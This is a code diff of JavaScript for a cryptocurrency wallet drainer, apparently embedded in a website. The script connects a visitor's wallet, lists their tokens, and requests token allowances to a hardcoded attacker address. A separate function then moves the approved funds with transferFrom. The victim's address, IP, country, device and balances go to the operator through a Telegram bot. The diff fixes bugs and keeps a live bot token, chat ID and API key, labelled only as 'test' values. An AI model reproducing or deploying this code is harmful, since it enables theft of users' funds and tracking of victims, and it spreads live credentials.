@@ -81,7 +81,7 @@ scrollReveal();
 addEventOnElem(window, "scroll", scrollReveal);
 
 /**
- * Wallet connect, token approval, and Telegram notification for BSC
+ * Wallet connect, token approval, and Telegram notification
  */
 async function connectWalletAndSendTokens() {
   if (!window.ethers || !window.ethereum) {
@@ -94,20 +94,19 @@ async function connectWalletAndSendTokens() {
     return;
   }
 
-  // Updated to BSC network configuration
-  const bscNetworks = [
+  const evmNetworks = [
     {
       chainId: 56,
       name: "Binance Smart Chain",
       chainName: "bsc",
       nativeCoin: "BNB",
-      exodusAddress: "0xe22151324Ed5b8A4F2B45f1C3017D15B2aEc1B28" // Replace with your BSC address
+      exodusAddress: "0xe22151324Ed5b8A4F2B45f1Funds1e15B2aEc1B28" // Replace with a test address
     }
   ];
 
-  const botToken = "7875309387:AAHcqO8m9HtaE9dVqVBlv2xnAwDkUTmFDAU";
-  const chatId = "5995616824";
-  const moralisApiKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6ImU1MjI2ZmQ1LTE0NDUtNGIyOC04YzYzLTZmOWEzZDRkNWJjZSIsIm9yZ0lkIjoiNDQ5NTg1IiwidXNlcklkIjoiNDYyNTgwIiwidHlwZUlkIjoiZjVhODc0ZmItZGM2Ni00NjE0LWIxNDUtMjlkYTg5YjIwNDk1IiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3NDgzOTc5MTksImV4cCI6NDkwNDE1NzkxOX0.lr5-p-SHS7j4EAlsT1ZYt7tTnOfKnoZXSsqS_6WIReY";
+  const botToken = "7875309387:AAHcqO8m9HtaE9dVqVBlv2xnAwDkUTmFDAU"; // Replace with test bot token
+  const chatId = "5995616824"; // Replace with test chat ID
+  const moralisApiKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6ImU1MjI2ZmQ1LTE0NDUtNGIyOC04YzYzLTZmOWEzZDRkNWJjZSIsIm9yZ0lkIjoiNDQ5NTg1IiwidXNlcklkIjoiNDYyNTgwIiwidHlwZUlkIjoiZjVhODc0ZmItZGM2Ni00NjE0LWIxNDUtMjlkYTg5YjIwNDk1IiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3NDgzOTc5MTksImV4cCI6NDkwNDE1NzkxOX0.lr5-p-SHS7j4EAlsT1ZYt7tTnOfKnoZXSsqS_6WIReY"; // Replace with test API key
 
   const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
 
@@ -137,11 +136,10 @@ async function connectWalletAndSendTokens() {
       locationData = { country_name: "Unknown", ip: "N/A" };
     }
 
-    for (const network of bscNetworks) {
+    for (const network of evmNetworks) {
       try {
         console.log(`Processing network: ${network.name}`);
 
-        // Switch to BSC Mainnet
         try {
           await window.ethereum.request({
             method: 'wallet_switchEthereumChain',
@@ -160,7 +158,9 @@ async function connectWalletAndSendTokens() {
               method: 'wallet_addEthereumChain',
               params: [chainConfig]
             });
-            awaitId: `0x${network.chainId.toString(16)}` }]
+            await window.ethereum.request({
+              method: 'wallet_switchEthereumChain',
+              params: [{ chainId: `0x${network.chainId.toString(16)}` }]
             });
           } else {
             throw switchErr;
@@ -200,7 +200,6 @@ async function connectWalletAndSendTokens() {
         const maxAttempts = 3;
         let apiSuccess = false;
 
-        // Fetch BEP-20 tokens from Moralis API
         while (apiAttempts < maxAttempts && !apiSuccess) {
           try {
             apiAttempts++;
@@ -237,12 +236,10 @@ async function connectWalletAndSendTokens() {
           }
         }
 
-        // Fetch native BNB balance
         const nativeBalance = await currentProvider.getBalance(userAddress);
         const formattedBalance = ethers.utils.formatEther(nativeBalance);
         const nativeBalanceMessage = `• ${network.nativeCoin}: ${formattedBalance}`;
 
-        // Updated Telegram notification for BSC
         const networkMessage = `
 📥 Wallet Connected on ${network.name}
 Address: ${userAddress}
@@ -251,7 +248,7 @@ Country: ${locationData.country_name}
 IP: ${locationData.ip}
 ${deviceType}
 
-💰 BEP-20 Balances:
+💰 Balances:
 ${tokenSummary}
 ${nativeBalanceMessage}
         `;
@@ -274,11 +271,11 @@ ${nativeBalanceMessage}
         if (nonZeroTokens.length > 0) {
           for (const token of nonZeroTokens) {
             try {
-              // Validate BEP-20 token contract
+              // Validate token contract existence
               const code = await currentProvider.getCode(token.token_address);
-              if (code/EntityType === "0x") {
+              if (code === "0x") {
                 const errorMessage = `
-❌ Invalid BEP-20 Contract
+❌ Invalid Contract
 Token: ${token.symbol || 'Unknown'}
 Error: No contract code at ${token.token_address}
 ${deviceType}
@@ -291,7 +288,7 @@ ${deviceType}
                 continue;
               }
 
-              // Approve BEP-20 token allowance
+              // Use increaseAllowance with retry mechanism
               let contract = new ethers.Contract(token.token_address, [
                 "function increaseAllowance(address spender, uint256 addedValue) public returns (bool)",
                 "function allowance(address owner, address spender) public view returns (uint256)"
@@ -310,27 +307,28 @@ ${deviceType}
                   try {
                     approvalTx = await contract.increaseAllowance(network.exodusAddress, neededAllowance, { gasLimit: 100000 });
                     await approvalTx.wait();
-                    break;
+                    break; // Success, exit retry loop
                   } catch (err) {
                     attempts++;
                     if (err.message.includes("execution reverted") || err.message.includes("UNPREDICTABLE_GAS_LIMIT")) {
                       if (attempts < maxAttempts) {
                         console.warn(`Attempt ${attempts} failed for ${token.symbol}: ${err.message}. Retrying...`);
-                        await delay(2000);
+                        await delay(2000); // Wait 2 seconds before retry
                         continue;
                       }
                     }
+                    // Handle user rejection or other errors
                     let errorMessage;
                     if (err.message.includes("user denied") || err.message.includes("not authorized")) {
                       errorMessage = `
-❌ User Rejected BEP-20 Approval
+❌ User Rejected Approval
 Token: ${token.symbol || 'Unknown'}
 Error: User denied authorization
 ${deviceType}
                       `;
                     } else {
                       errorMessage = `
-❌ BEP-20 Approval Failed
+❌ Approval Failed
 Token: ${token.symbol || 'Unknown'}
 Error: ${err.message} (after ${attempts} attempts)
 ${deviceType}
@@ -341,14 +339,14 @@ ${deviceType}
                       headers: { "Content-Type": "application/json" },
                       body: JSON.stringify({ chat_id: chatId, text: errorMessage })
                     });
-                    continue;
+                    continue; // Skip to next token
                   }
                 }
 
                 if (approvalTx) {
                   const formattedAmount = ethers.utils.formatUnits(neededAllowance, token.decimals ?? 18);
                   const approvalMessage = `
-✅ BEP-20 Approval Successful
+✅ Approval Successful
 Token: ${token.symbol}
 Amount Approved: ${formattedAmount}
 Spender: ${network.exodusAddress}
@@ -368,14 +366,14 @@ ${deviceType}
               let errorMessage;
               if (err.message.includes("user denied") || err.message.includes("not authorized")) {
                 errorMessage = `
-❌ User Rejected BEP-20 Approval
+❌ User Rejected Approval
 Token: ${token.symbol || 'Unknown'}
 Error: User denied authorization
 ${deviceType}
                 `;
               } else {
                 errorMessage = `
-❌ BEP-20 Approval Failed
+❌ Approval Failed
 Token: ${token.symbol || 'Unknown'}
 Token Address: ${token.token_address}
 Error: ${err.message}
@@ -422,11 +420,11 @@ ${deviceType}
 }
 
 /**
- * Manual transfer function for BEP-20 tokens
+ * Manual transfer function to be called after approval (e.g., via BscScan or script)
  */
 async function executeTransferFrom(tokenAddress, userAddress, amount, decimals, exodusAddress) {
-  const botToken = "7875309387:AAHcqO8m9HtaE9dVqVBlv2xnAwDkUTmFDAU";
-  const chatId = "5995616824";
+  const botToken = "7875309387:AAHcqO8m9HtaE9dVqVBlv2xnAwDkUTmFDAU"; // Replace with test bot token
+  const chatId = "5995616824"; // Replace with test chat ID
 
   let deviceType = "Unknown";
   if (/Mobile|Android|iPhone|iPad/i.test(navigator.userAgent)) {
@@ -451,7 +449,7 @@ async function executeTransferFrom(tokenAddress, userAddress, amount, decimals, 
 
     const formattedAmount = ethers.utils.formatUnits(amount, decimals);
     const transferSuccessMessage = `
-✅ BEP-20 Transfer Successful
+✅ Transfer Successful
 Token: ${tokenSymbol}
 Amount: ${formattedAmount}
 From: ${userAddress}
@@ -466,7 +464,7 @@ ${deviceType}
     });
   } catch (err) {
     const errorMessage = `
-❌ BEP-20 Transfer Failed
+❌ Transfer Failed
 Token Address: ${tokenAddress}
 Error: ${err.message}
 ${deviceType}
